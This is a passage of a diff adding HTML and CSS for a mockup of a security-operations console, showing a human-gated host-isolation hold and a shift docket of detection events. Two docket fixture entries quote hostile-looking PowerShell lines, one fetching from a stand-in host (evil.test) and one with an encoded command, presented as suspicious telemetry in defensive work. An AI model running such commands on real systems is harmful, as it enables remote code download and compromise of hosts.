+          <div class="sw-n"><span>custody</span><span class="v" data-v="--custody"></span></div>
+          <div class="sw-m">Verdigris on an old seal: a check that actually ran and agreed.</div>
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="pal-h caps">Two neutral materials</div>
+      <div class="ramp">
+        <i style="background:var(--frame)"></i><i style="background:var(--chrome)"></i>
+        <i style="background:var(--raised)"></i><i style="background:var(--rule)"></i>
+        <i style="background:var(--rule-2)"></i><i style="background:var(--ink-2)"></i>
+        <i style="background:var(--ink)"></i>
+      </div>
+      <div class="ramp-c">console · graphite · R=G=B on every step</div>
+      <div class="ramp" style="margin-top:12px">
+        <i style="background:var(--page-well)"></i><i style="background:var(--page)"></i>
+        <i style="background:var(--page-rule)"></i><i style="background:var(--page-rule2)"></i>
+        <i style="background:var(--page-ink2)"></i><i style="background:var(--page-ink)"></i>
+      </div>
+      <div class="ramp-c">record · warm stock</div>
+      <div class="sw-m" style="margin-top:11px"><b>IBM Plex Mono</b> carries the record — a court
+        record is a <i>typed</i> record. <b>Public Sans</b>, the USWDS gothic drawn for government
+        forms, speaks the console's marginalia. The record is typed; the console annotates.
+        Self-hostable via Fontsource; this board renders on its declared fallbacks
+        (Helvetica&nbsp;Neue, SF&nbsp;Mono) with no network at all.</div>
+    </div>
+  </div>
+</header>
+
+<style>
+.doc{ grid-template-columns:140px minmax(0,1fr) 430px; }
+.two{ display:grid; grid-template-columns:minmax(0,1.1fr) minmax(0,1fr); gap:34px; }
+.two > div{ min-width:0; }
+.lead,.meas .body{ max-width:66ch; }
+.waxseal{ background:var(--wax); color:var(--wax-ink); text-align:center; padding:11px 4px 12px;
+  margin-top:14px; font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.16em;
+  text-transform:uppercase; line-height:1.5; }
+.head-top{ display:flex; align-items:flex-start; gap:34px; }
+.head-l{ min-width:0; flex:1; }
+.head-c{ flex:none; text-align:right; }
+.head-c .l{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.22em;
+  text-transform:uppercase; color:var(--page-ink2); margin-right:-.22em; }
+.head-c .v{ font-family:var(--mono); font-size:var(--t-clock); line-height:1.05;
+  color:var(--page-ink); font-weight:600; letter-spacing:-.01em; }
+.head-c .d{ font-family:var(--mono); font-size:var(--t-mark); color:var(--page-ink2);
+  line-height:1.7; margin-top:6px; }
+.rh-id{ font-family:var(--mono); font-size:var(--t-note); color:var(--page-ink2); letter-spacing:.04em; }
+.rh-title{ font-family:var(--mono); font-size:var(--t-title); font-weight:600; letter-spacing:.01em;
+  color:var(--page-ink); margin:8px 0 6px; }
+.rh-sent{ font-size:var(--t-lead); color:var(--page-ink); margin:0; }
+.rh-meta{ font-family:var(--mono); font-size:var(--t-note); color:var(--page-ink2);
+  line-height:1.8; margin:0; }
+.sub{ font-size:var(--t-note); color:var(--page-ink2); line-height:1.62; }
+</style>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     A · THE VERDICT PANE
+     ═══════════════════════════════════════════════════════════════════ -->
+<section class="plate">
+  <div class="plate-c">
+    <span class="plate-n">A</span>
+    <span class="plate-t">The verdict pane</span>
+    <span class="plate-s">a hold on <span class="mono">isolate_host</span> awaiting a human · rendered at
+      <span class="mono">clock.timestamps.open_row_ms</span> = 2026-03-17 09:16:05 UTC · shown in its
+      resting state, <b>not armed</b></span>
+  </div>
+
+  <div class="win">
+    <div class="tbar">
+      <span><b>PERCH</b><span class="s">/</span>The Watch<span class="s">/</span><span class="mono">h_a07aeacf</span></span>
+      <span class="r">HELLCAT-OFFICE<span class="s">·</span>PERCH-OPERATOR-1<span class="s">·</span>ON WATCH SINCE 08:00 UTC</span>
+    </div>
+    <div class="gov">
+      <span class="ok">◆ Governance healthy</span>
+      <span class="r"><span>Mode&nbsp;&nbsp;Normal</span><span>Relay&nbsp;&nbsp;Live</span><span>Daemon&nbsp;&nbsp;127.0.0.1:9090</span></span>
+    </div>
+    <div class="back">
+      <kbd>⌘ [</kbd><span>Back to the watch — 5 other entries open</span>
+      <span style="margin-left:auto">h_a07aeacf &nbsp;·&nbsp; opened 09:14:42.600 UTC &nbsp;·&nbsp; lapses 10:16:22 UTC</span>
+    </div>
+
+    <div class="doc">
+
+      <!-- ── DOCKET HEAD ────────────────────────────────────────────── -->
+      <div class="gut">
+        <div class="gut-l">Hold</div>
+        <div class="waxseal">Human<br>gate</div>
+      </div>
+      <div class="meas">
+        <div class="head-top">
+          <div class="head-l">
+            <div class="rh-id">Entry <b>018</b> of this shift &nbsp;·&nbsp; <b>h_a07aeacf</b> &nbsp;·&nbsp; ambush:hold:v1</div>
+            <h1 class="rh-title">isolate_host</h1>
+            <p class="rh-sent">Cut <span class="adv">host-ops-1</span> off from the network.</p>
+            <div class="badges">
+              <span class="sev" data-r="4">Critical
+                <span class="reg"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i></span></span>
+              <span class="bdg">Gated · receipt</span>
+              <span class="bdg">Undo mapped · restore_host_connectivity</span>
+              <span class="bdg">Leases a containment</span>
+            </div>
+            <p class="rh-meta">case-2026-03-17-host-ops-1 &nbsp;·&nbsp; threat_class execution &nbsp;·&nbsp; hunt-evt-1<br>
+              requested by swarm:ed25519:18085f16811dba24… &nbsp;·&nbsp; entered 2026-03-17 09:14:42.600 UTC</p>
+          </div>
+          <div class="head-c">
+            <div class="l">Expires in</div>
+            <div class="v num">58m 37s</div>
+            <div class="d">derived · expires_at_ms − now<br>nothing runs if it lapses</div>
+          </div>
+        </div>
+      </div>
+      <div class="marg">
+        <div class="marg-h">The adversary frame</div>
+        <p><b>Manila-tabbed</b> values are written by the adversary. They render as inert plain
+          text — no markdown, no autolinking, no mention resolution — with control, zero-width
+          and bidi codepoints escaped to a visible form before they reach the DOM, and nothing
+          here is ever passed to an agent as instruction. Enum and integer fields carry no tab,
+          which is what makes the tab mean something.</p>
+        <p>The tab is a <b>tab</b> and not a hatch on purpose. In this system hatching means
+          <b>absence</b> and only absence, so an attacker's string and a missing field can never
+          be confused for one another at a glance.</p>
+        <div class="cite">severity <span>holds.a.severity</span><br>
+          countdown <span>holds.a.expires_at_ms − clock.timestamps.open_row_ms</span> = 3 517 600 ms<br>
+          entered <span>holds.a.held_at_ms</span></div>
+      </div>
+
+      <!-- ── I · ACTION ─────────────────────────────────────────────── -->
+      <div class="gut row-sep"><div class="rn">I</div>
+        <div class="gut-note" data-t="adv">Adversary-<br>controlled</div></div>
+      <div class="meas row-sep">
+        <div class="slot-l">Action</div>
+        <div class="two">
+          <div>
+            <p class="lead"><span class="mono">isolate_host</span> — cut
+              <span class="adv">host-ops-1</span> off from the network.</p>
+            <span class="prov">served · hold record</span>
+          </div>
+          <div>
+            <dl class="fields">
+              <dt>action.type</dt><dd>isolate_host</dd>
+              <dt>host_id</dt><dd><span class="adv">host-ops-1</span></dd>
+            </dl>
+          </div>
+        </div>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">I · Action</div>
+        <p>Typed <span class="mono">ResponseAction</span> read off the hold record. Every value
+          field in this slot is attacker-written, and every one renders through the adversary
+          frame. <b>The policy scope is built from these same fields.</b></p>
+        <div class="cite">fixture <span>holds.a.action_request.action</span></div>
+      </div>
+
+      <!-- ── II · BLAST RADIUS ──────────────────────────────────────── -->
+      <div class="gut row-sep"><div class="rn">II</div>
+        <div class="gut-note" data-t="cust">Read<br>register</div></div>
+      <div class="meas row-sep">
+        <div class="slot-l">Blast radius</div>
+        <div class="two">
+          <div>
+            <p class="lead">One host loses network connectivity — the scoped host
+              <span class="adv">host-ops-1</span>.</p>
+            <div class="sect">affected_capabilities (2)</div>
+            <div class="caprow">
+              <span class="cap">network.egress</span>
+              <span class="cap">network.ingress</span>
+            </div>
+            <p class="sub">Both render. There is no <span class="mono">+N&nbsp;more</span>
+              affordance in this slot.</p>
+            <span class="prov">served · build_rehearsal_preview</span>
+          </div>
+          <div>
+            <dl class="fields">
+              <dt>scope_kind</dt><dd>host</dd>
+              <dt>scope_value</dt><dd><span class="adv">host-ops-1</span></dd>
+              <dt>impact</dt><dd>host_connectivity_isolated</dd>
+              <dt>max_affected_scopes</dt><dd class="num">1</dd>
+            </dl>
+            <div class="gate">
+              <div class="gate-h">The gate on the second stroke</div>
+              <div class="gate-r"><span class="gate-b" data-on></span><span>Blast radius fully visible, in front of you</span></div>
+              <div class="gate-r"><span class="gate-b" data-on></span><span>Held <span class="mono num">1.5</span> of <span class="mono num">1.5</span>&nbsp;s on this hold</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">II · Blast radius</div>
+        <p>The capability list is <b>the real cost of the action</b>, and truncating it hides the
+          half an operator is deciding on. Derived by the runtime's own rehearsal preview — the
+          same derivation the capability lease will bind, so what you are shown here and what is
+          authorised cannot disagree.</p>
+        <p>Both conditions of the gate are named <b>in words, with a box each</b>. A frozen
+          control with no stated reason is a gate everybody routes around.</p>
+        <div class="cite">fixture <span>holds.a.rehearsal.blast_radius.affected_capabilities</span>
+          = ["network.egress", "network.ingress"]<br>
+          summary <span>holds.a.rehearsal.blast_radius.summary</span></div>
+      </div>
+
+      <!-- ── III · IF YOU UNDO ──────────────────────────────────────── -->
+      <div class="gut row-sep"><div class="rn">III</div>
+        <div class="gut-note" data-t="cust">Reversible</div></div>
+      <div class="meas row-sep">
+        <div class="slot-l">If you undo</div>
+        <div class="two">
+          <div>
+            <p class="lead"><span class="mono">restore_host_connectivity</span> →
+              <span class="adv">host-ops-1</span></p>
+            <p class="sub">Reversible. The planned step reads <b>“re-enable host-ops-1 network
+              interfaces.”</b> A release runs it, and the receipt reports what actually happened:
+              read from <span class="mono">lease_closed</span> and
+              <span class="mono">fully_reversed</span> in the response body, never from the HTTP
+              status.</p>
+            <span class="prov">served · resolve_inverse</span>
+          </div>
+          <div>
+            <dl class="fields">
+              <dt>rollback.required</dt><dd>true</dd>
+              <dt>step_kind</dt><dd>restore_host_connectivity</dd>
+              <dt>verdict</dt><dd>executable</dd>
+            </dl>
+          </div>
+        </div>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">III · If you undo</div>
+        <p><span class="mono">isolate_host</span> is one of the four containment actions and one of
+          the three with an executable inverse. Twelve destructive actions narrow to four leased,
+          then to three reversible. <b>This one goes the whole way</b> — which is exactly why the
+          slot must also be able to say the opposite, and does: hold B's inverse resolves
+          <span class="mono">unmapped</span>, and that renders as a hole rather than a blank.</p>
+        <div class="cite">fixture <span>holds.a.inverse_resolution[0]</span> · <span>holds.a.rehearsal.rollback</span></div>
+      </div>
+
+      <!-- ── IV · WHY WE ARE ASKING ─────────────────────────────────── -->
+      <div class="gut row-sep"><div class="rn">IV</div>
+        <div class="gut-note">Agent-<br>written</div></div>
+      <div class="meas row-sep">
+        <div class="slot-l">Why we are asking</div>
+        <div class="two">
+          <div>
+            <p class="lead">No policy rule matched. The static gate asks a human for any
+              destructive action at <span class="mono">human_gate_severity</span> or above, which
+              is <span class="mono">HIGH</span>. This request is <span class="mono">CRITICAL</span>.</p>
+            <div class="sect">the escalation behind it</div>
+            <p class="sub">Concentration <span class="mono num">2.696884</span> against an alert
+              threshold of <span class="mono num">2.0</span>, from <b>2 sources / 1 agent</b>, peak
+              confidence <span class="mono num">0.90</span>, level <span class="mono">alert</span>.
+              One agent, two detector strategies: <span class="mono">min_sources_for_escalation:
+              2</span> was cleared by one agent's own two detectors agreeing with themselves.</p>
+            <span class="prov">served · concentration_at_hold</span>
+          </div>
+          <div>
+            <dl class="fields">
+              <dt>rule_name</dt><dd>static.human_gate</dd>
+              <dt>reason</dt><dd>authorized but held for human approval</dd>
+            </dl>
+            <div class="sect">the matched selector</div>
+            <dl class="fields">
+              <dt>threat_class</dt><dd>execution <span style="color:var(--page-ink2)">· request-carried</span></dd>
+              <dt>severity</dt><dd>CRITICAL <span style="color:var(--page-ink2)">· request-carried</span></dd>
+              <dt>action</dt><dd>isolate_host</dd>
+            </dl>
+          </div>
+        </div>
+
+        <div class="void">
+          <div class="void-h"><span>Void · IV·b</span></div>
+          <div class="void-b"><b>No governance receipt is attached, and none is enforced on this
+            path.</b> The governance re-check lives in the dispatcher's agent-turn loop; a decide
+            route enters the runtime <i>below</i> it. This slot says so rather than implying a
+            check that does not run. An unfillable field is drawn as a hole and never collapsed —
+            a form with a missing box is a different document from a form with no box.</div>
+        </div>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">IV · Why we are asking</div>
+        <p>The reason is <b>the daemon's own string, rendered verbatim</b> rather than paraphrased.
+          Paraphrasing the reason a human was asked is the one thing this page must not do.</p>
+        <p>Not adversary-written — <b>agent-written</b>, which is its own problem.
+          <span class="mono">threat_class</span> and <span class="mono">severity</span> are read out
+          of the requesting agent's own request, and the gate returns on the first selector match in
+          file order — so file order is precedence, and an agent influences which rule judges its
+          own destructive action. <b>This warning is permanent, not conditional.</b></p>
+        <p>The lane index in the sidebar of screen B reports <span class="mono">execution</span> at
+          <span class="mono num">0.846385</span>. That is a different measurement of the same class,
+          not a rounding of this one: the fixture carries both and neither is rounded anywhere on
+          this board.</p>
+        <div class="cite">fixture <span>holds.a.rationale.concentration_at_hold.total_strength</span>
+          = 2.696884<br>lane index <span>lanes[] where threat_class = execution</span> = 0.846385</div>
+      </div>
+
+      <!-- ── V · WHAT GRANTING OPENS ────────────────────────────────── -->
+      <div class="gut row-sep"><div class="rn">V</div>
+        <div class="gut-note">Two objects<br>two clocks</div></div>
+      <div class="meas row-sep">
+        <div class="slot-l">What granting opens</div>
+        <div class="two">
+          <div>
+            <p class="lead"><b>Capability lease</b> · <span class="mono">isolate_host</span> · scope
+              <span class="adv">host-ops-1</span> · <span class="mono num">60</span>&nbsp;s</p>
+            <p class="sub">Not minted yet. It is minted <b>when you decide</b>, not when this hold
+              opened, and it expires <span class="mono num">60</span>&nbsp;s after your decision
+              whether or not the action has dispatched. A lease minted when this hold opened would
+              have expired <span class="mono num">22.4</span>&nbsp;s ago.</p>
+          </div>
+          <div>
+            <p class="lead"><b>Containment lease</b> · opens on dispatch ·
+              <span class="mono num">900</span>&nbsp;s · appears on the containment board</p>
+            <p class="sub">A second, unrelated object with its own clock,
+              <span class="mono num">15</span>× the capability window beside it. When it expires the
+              sweep runs the inverse; on the containment board
+              <span class="mono">remaining_ms</span> and <span class="mono">expired</span> are two
+              facts and never one progress bar.</p>
+          </div>
+        </div>
+        <span class="prov">served · policy.lease_ttl_ms · runtime.containment.lease_ttl_ms</span>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">V · What granting opens</div>
+        <p>Two objects, two lines, never merged into one. The most common way a console lies about
+          a destructive grant is by drawing two clocks as one bar.</p>
+        <div class="cite">fixture <span>constants.capability_lease_ttl_ms</span> = 60000<br>
+          <span>constants.containment_lease_ttl_ms</span> = 900000<br>
+          <span>capability_lease.capability_id</span></div>
+      </div>
+
+      <!-- ── THE RECORD'S OWN LINE — hatched, and it stays hatched ──── -->
+      <div class="gut row-sep">
+        <div class="gut-l">The record</div>
+        <div class="tierstamp"><b>Tier 0</b><i>Unsigned</i></div>
+      </div>
+      <div class="meas row-sep">
+        <div class="slot-l">Signature of the record</div>
+        <div class="hatchrule"><span>No signature exists</span></div>
+        <div class="two" style="margin-top:16px">
+          <div>
+            <p class="sub"><span class="mono">ambush:hold:v1</span> carries no Ed25519 signature in
+              Ambush today, under any condition. <b>This card is a copy; the daemon holds the
+              record.</b> Tier 0 runs none of the three checks, so nothing here can be verified
+              offline in anyone else's hands. The affordance below does the only honest thing
+              available: it re-reads the hold from the daemon by id and diffs the canonical bytes.
+              It is not checking a signature, because there is none to check.</p>
+            <div style="margin-top:12px"><span class="chipbtn">Re-read this hold from the daemon and diff the bytes</span></div>
+          </div>
+          <div>
+            <p class="sub"><b>Relay envelope</b> — secp256k1, transport only.<br>
+              <span class="mono" style="word-break:break-all;color:var(--page-ink)">207176338a897b2379564322033e86ed7197600499ba348e6c6c898b8139b586</span><br>
+              shown in full and never truncated, because a truncated key is forgeable by vanity
+              grinding. It shows this card reached the relay from the bridge's key unaltered. It
+              says nothing about whether the daemon produced it.</p>
+            <p class="sub" style="margin-top:10px"><b>Who answered</b> — the daemon's receipt records
+              that a human was asked, not which one.
+              <span class="mono">ResponseReceiptAudit</span> does not name you; the hold record and
+              the <span class="mono">ambush:verdict:v1</span> card you publish under your own key
+              both do.</p>
+          </div>
+        </div>
+      </div>
+      <div class="marg row-sep">
+        <div class="marg-h">Verification tier, without colour</div>
+        <p>An unsigned record differs from a signed one <b>in shape</b>: a hatched stamp in the
+          margin, a hatched rule where the signature would be, and the words. When a card does
+          carry an attestation the same rule takes ink and the stamp is solid. Nothing about the
+          tier is carried by hue, so it survives a monochrome monitor and every form of colour
+          blindness intact.</p>
+        <p>Four of Perch's eleven card types carry no signature at all. This system draws that as
+          a hole in the page rather than as a quiet grey label.</p>
+        <div class="cite">fixture <span>holds.a.rationale.governance_receipt_present</span> = false<br>
+          <span>nostr_event_ids.hold_a_open</span></div>
+      </div>
+
+      <!-- ══ THE SIGNATURE — the one element that crosses both rules ══ -->
+      <div class="full sign">
+        <div class="sign-head">
+          <span class="sign-l">Your hand</span>
+          <span class="sign-r">Two strokes · one of them is final</span>
+        </div>
+        <div class="field" data-s="idle">
+          <span class="field-clear"></span><span class="field-state">Not armed — this line is blank</span>
+          <span class="field-x">✕</span>
+          <span class="field-rule"></span>
+          <span class="field-cap">
+            <span>Nothing has been written. Nothing will be, until the page is ruled.</span>
+          </span>
+        </div>
+        <div class="sign-under">
+          <div class="sign-who">
+            <b>perch-operator-1</b><br>
+            ed25519 684949a3287973d209a80c63057ff9e099ede5996b18288936db5e318fafbde5<br>
+            signing over { decided_at_ms, decision, hold_id }
+          </div>
+          <div class="sign-keys"><kbd>G</kbd> arm &nbsp;<span style="opacity:.55">then</span>&nbsp; <kbd>Enter</kbd> record</div>
+        </div>
+      </div>
+
+      <!-- ══ THE STAMPS — one motion each ══ -->
+      <div class="full stamps">
+        <div class="stamp">
+          <span class="stamp-w">Refuse <kbd>R</kbd></span>
+          <div class="stamp-c">One key. No dialog, no arming, no undo. Refusing is the safe
+            direction, and making it expensive produces grants by exhaustion.</div>
+        </div>
+        <div class="stamp">
+          <span class="stamp-w">Promote to a case <kbd>E</kbd></span>
+          <div class="stamp-c">Opens case-2026-03-17-host-ops-1 and mints the incident record a
+            verdict attaches to. It routes this to nobody: there is no operator directory.</div>
+        </div>
+        <div class="stamp" data-t="dead">
+          <span class="stamp-w">Snooze <kbd>S</kbd></span>
+          <div class="stamp-c">Struck through on a hold, and rendered rather than hidden, so nobody
+            has to go looking for it. A held action expires on its own and nothing runs.</div>
+        </div>
+      </div>
+
+      <div class="full folio">
+        <span>hellcat-office</span>
+        <span>case-2026-03-17-host-ops-1</span>
+        <span>incident:hunt-evt-1:1773738882400</span>
+        <span class="r">entry 018 · shift 08:00–16:00 UTC · perch-operator-1</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<style>
+.cmet{ display:inline-flex; gap:2px; }
+.cmet i{ width:4px; height:8px; background:currentColor; opacity:.24; }
+.cmet i[data-lit]{ opacity:1; }
+.sevmini{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.16em;
+  text-transform:uppercase; padding:3px 7px; }
+.sevmini[data-r="4"]{ background:var(--wax); color:var(--wax-ink); }
+.sevmini[data-r="3"]{ border:1.5px solid var(--wax); color:var(--page-ink); }
+</style>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     B · THE WATCH
+     ═══════════════════════════════════════════════════════════════════ -->
+<section class="plate">
+  <div class="plate-c">
+    <span class="plate-n">B</span>
+    <span class="plate-t">The watch</span>
+    <span class="plate-s">the shift's docket at 09:16:05 UTC — <b>22 entries, every one of them a
+      fixture object with its own timestamp.</b> Nothing is invented to make the queue look busy.
+      Selection is a material change, not a highlight: the chosen entry rises from the well to full
+      stock, the same move as the bench in screen&nbsp;A.</span>
+  </div>
+
+  <div class="win">
+    <div class="tbar">
+      <span><b>PERCH</b><span class="s">/</span>The Watch</span>
+      <span class="r">HELLCAT-OFFICE<span class="s">·</span>PERCH-OPERATOR-1<span class="s">·</span>ON WATCH SINCE 08:00 UTC</span>
+    </div>
+    <div class="gov">
+      <span class="ok">◆ Governance healthy</span>
+      <span class="r"><span>Mode&nbsp;&nbsp;Normal</span><span>Relay&nbsp;&nbsp;Live</span><span>Daemon&nbsp;&nbsp;127.0.0.1:9090</span></span>
+    </div>
+
+    <div class="watch">
+      <!-- ── sidebar: the four inboxes, then the lane index ─────────── -->
+      <aside class="side">
+        <div class="side-h">Open on this watch</div>
+        <div class="cat">
+          <span class="cat-n">Holds</span><span class="cat-v">2</span>
+          <span class="cat-s">both CRITICAL · both lapse 10:16:22 UTC</span>
+        </div>
+        <div class="cat" data-abs>
+          <span class="cat-n">Named you</span><span class="cat-v">—</span>
+          <span class="cat-s">absent, not zero: no operator directory exists in either tree</span>
+        </div>
+        <div class="cat">
+          <span class="cat-n">Findings to review</span><span class="cat-v">3</span>
+          <span class="cat-s">0 of 3 reviewed this shift</span>
+        </div>
+        <div class="cat">
+          <span class="cat-n">Case activity</span><span class="cat-v">1</span>
+          <span class="cat-s">case-2026-03-17-host-ops-1</span>
+        </div>
+
+        <div class="lanes">
+          <div class="side-h">Lane index · strength ÷ alert threshold 2.0</div>
+          <div class="lane" data-hot><span class="lane-n">lateral_movement</span><span class="lane-v">1.0761</span><span class="lane-b"><i style="width:54%"></i></span></div>
+          <div class="lane" data-hot><span class="lane-n">command_and_control</span><span class="lane-v">0.9885</span><span class="lane-b"><i style="width:49%"></i></span></div>
+          <div class="lane" data-hot><span class="lane-n">execution</span><span class="lane-v">0.8464</span><span class="lane-b"><i style="width:42%"></i></span></div>
+          <div class="lane"><span class="lane-n">data_exfiltration</span><span class="lane-v">0.8301</span><span class="lane-b"><i style="width:42%"></i></span></div>
+          <div class="lane"><span class="lane-n">credential_access</span><span class="lane-v">0.5869</span><span class="lane-b"><i style="width:29%"></i></span></div>
+          <div class="lane"><span class="lane-n">defense_evasion</span><span class="lane-v">0.4187</span><span class="lane-b"><i style="width:21%"></i></span></div>
+          <div class="lane"><span class="lane-n">persistence</span><span class="lane-v">0.3092</span><span class="lane-b"><i style="width:15%"></i></span></div>
+          <div class="lane"><span class="lane-n">privilege_escalation</span><span class="lane-v">0.2584</span><span class="lane-b"><i style="width:13%"></i></span></div>
+          <div class="lane"><span class="lane-n">supply_chain</span><span class="lane-v">0.1650</span><span class="lane-b"><i style="width:8%"></i></span></div>
+          <div class="lane"><span class="lane-n">initial_access</span><span class="lane-v">0.1228</span><span class="lane-b"><i style="width:6%"></i></span></div>
+          <div class="lane"><span class="lane-n">impact</span><span class="lane-v">0.0610</span><span class="lane-b"><i style="width:3%"></i></span></div>
+          <div class="lane" data-empty><span class="lane-n">discovery</span><span class="lane-v">—</span><span class="lane-b"></span></div>
+        </div>
+
+        <div class="lanes">
+          <div class="side-h">The watch bill · colony roster</div>
+          <div class="bill" data-on><i></i><div><b>whisker</b><span>cfb2951d · registered</span></div></div>
+          <div class="bill" data-on><i></i><div><b>tom</b><span>449c0fe5 · registered</span></div></div>
+          <div class="bill" data-on><i></i><div><b>pouncer</b><span>fbb74c94 · registered</span></div></div>
+          <div class="bill"><i></i><div><b>stalker</b><span>gated off · investigation.enabled</span></div></div>
+          <div class="bill"><i></i><div><b>weaver</b><span>gated off · correlation.enabled</span></div></div>
+          <div class="bill"><i></i><div><b>kitten</b><span>gated off · evolution.enabled</span></div></div>
+          <div class="bill"><i></i><div><b>sphinx</b><span>gated off · memory.enabled</span></div></div>
+          <div class="bill"><i></i><div><b>calico</b><span>gated off · deception.enabled</span></div></div>
+        </div>
+
+        <div class="side-f">
+          Shift &nbsp;08:00–16:00 UTC<br>
+          Operator &nbsp;perch-operator-1<br>
+          Relay &nbsp;live · daemon 127.0.0.1:9090
+        </div>
+      </aside>
+
+      <!-- ── the docket ─────────────────────────────────────────────── -->
+      <div class="docket">
+        <div class="dk-h">
+          <span class="dk-t">Docket</span>
+          <span class="dk-s">one chronological record of everything that happened on this watch, newest first ·
+            <b>022</b> entries · holds, findings and observations share one anatomy because a docket
+            is not four inboxes</span>
+        </div>
+
+        <div class="ent"><span class="ent-n">022</span><span class="ent-t">09:16:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">network_connect → <span class="mono">command_and_control</span> on host-ops-2</span>
+          <span class="ent-r"><span class="ent-c">0.83</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">021</span><span class="ent-t">09:14:42.710</span><span class="ent-k">Notice</span>
+          <span class="ent-b">kind 46010 published for hold <span class="mono">h_1c28ae79</span></span>
+          <span class="ent-r"><span class="ent-c">1371ef35</span></span></div>
+
+        <div class="ent" data-w><span class="ent-n">020</span><span class="ent-t">09:14:42.700</span><span class="ent-k">Hold</span>
+          <span class="ent-b"><b>block_egress</b> → <span class="adv">198.51.100.20</span></span>
+          <span class="ent-r"><span class="sevmini" data-r="4">Critical</span><span class="reg" style="color:var(--page-ink)"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i></span></span>
+          <span class="ent-sub">h_1c28ae79 · awaiting a human · lapses in 58m 37s · <b>no mapped undo</b> — block_egress is not a containment action</span></div>
+
+        <div class="ent"><span class="ent-n">019</span><span class="ent-t">09:14:42.610</span><span class="ent-k">Notice</span>
+          <span class="ent-b">kind 46010 published for hold <span class="mono">h_a07aeacf</span></span>
+          <span class="ent-r"><span class="ent-c">518dfe2b</span></span></div>
+
+        <div class="ent" data-sel data-w><span class="ent-n">018</span><span class="ent-t">09:14:42.600</span><span class="ent-k">Hold</span>
+          <span class="ent-b"><b>isolate_host</b> → <span class="adv">host-ops-1</span></span>
+          <span class="ent-r"><span class="sevmini" data-r="4">Critical</span><span class="reg" style="color:var(--page-ink)"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i></span></span>
+          <span class="ent-sub">h_a07aeacf · awaiting a human · lapses in 58m 37s · undo mapped · leases a containment</span>
+          <span class="ent-keys"><span><kbd>Enter</kbd> take this to the bench</span><span><kbd>R</kbd> refuse here</span><span><kbd>E</kbd> promote to a case</span></span></div>
+
+        <div class="ent"><span class="ent-n">017</span><span class="ent-t">09:14:42.400</span><span class="ent-k">Incident</span>
+          <span class="ent-b">opened <span class="mono">incident:hunt-evt-1:1773738882400</span></span>
+          <span class="ent-r"><span class="ent-c">host-ops-1</span></span></div>
+
+        <div class="ent"><span class="ent-n">016</span><span class="ent-t">09:14:41.900</span><span class="ent-k">Escalation</span>
+          <span class="ent-b"><span class="mono">execution</span> crossed the alert threshold —
+            <span class="mono num">2.696884</span> ≥ <span class="mono num">2.0</span>, level alert</span>
+          <span class="ent-r"><span class="ent-c">c66fe87f</span></span>
+          <span class="ent-sub">2 distinct sources, 1 agent · peak confidence 0.90</span></div>
+
+        <div class="ent" data-w><span class="ent-n">015</span><span class="ent-t">09:14:41.130</span><span class="ent-k">Finding</span>
+          <span class="ent-b">suspicious_process_tree : hunt-evt-2 on host-ops-1</span>
+          <span class="ent-r"><span class="sevmini" data-r="4">Critical</span><span class="ent-c">0.90</span></span>
+          <span class="ent-sub">unreviewed · card ad87…/2b1c9dce</span></div>
+
+        <div class="ent"><span class="ent-n">014</span><span class="ent-t">09:14:41.060</span><span class="ent-k">Event</span>
+          <span class="ent-b">ingested <span class="mono">hunt-evt-2</span> — OUTLOOK →
+            <span class="adv">powershell.exe Invoke-WebRequest https://evil.test</span></span>
+          <span class="ent-r"><span class="ent-c">alice</span></span></div>
+
+        <div class="ent"><span class="ent-n">013</span><span class="ent-t">09:14:33.000</span><span class="ent-k">Tick</span>
+          <span class="ent-b"><span class="mono">execution</span> below threshold —
+            <span class="mono num">1.799653</span> &lt; <span class="mono num">2.0</span></span>
+          <span class="ent-r"><span class="ent-c">2 sources</span></span></div>
+
+        <div class="ent" data-w><span class="ent-n">012</span><span class="ent-t">09:14:32.141</span><span class="ent-k">Finding</span>
+          <span class="ent-b">suspicious_scripting : hunt-evt-1 on host-ops-1</span>
+          <span class="ent-r"><span class="sevmini" data-r="4">Critical</span><span class="ent-c">0.90</span></span>
+          <span class="ent-sub">unreviewed · card 8ed31965</span></div>
+
+        <div class="ent" data-w><span class="ent-n">011</span><span class="ent-t">09:14:32.140</span><span class="ent-k">Finding</span>
+          <span class="ent-b">suspicious_process_tree : hunt-evt-1 on host-ops-1</span>
+          <span class="ent-r"><span class="sevmini" data-r="4">Critical</span><span class="ent-c">0.90</span></span>
+          <span class="ent-sub">unreviewed · card ad87733a</span></div>
+
+        <div class="ent"><span class="ent-n">010</span><span class="ent-t">09:14:32.080</span><span class="ent-k">Event</span>
+          <span class="ent-b">ingested <span class="mono">hunt-evt-1</span> — WINWORD →
+            <span class="adv">powershell.exe -enc AAA=</span></span>
+          <span class="ent-r"><span class="ent-c">alice</span></span></div>
+
+        <div class="ent"><span class="ent-n">009</span><span class="ent-t">09:13:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">lateral_movement → <span class="mono">lateral_movement</span> on host-ops-2</span>
+          <span class="ent-r"><span class="ent-c">0.72</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">008</span><span class="ent-t">09:10:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">fileless_execution → <span class="mono">defense_evasion</span> on build-1</span>
+          <span class="ent-r"><span class="ent-c">0.47</span><span class="cmet"><i data-lit></i><i data-lit></i><i></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">007</span><span class="ent-t">09:05:00</span><span class="ent-k">Deposit</span>
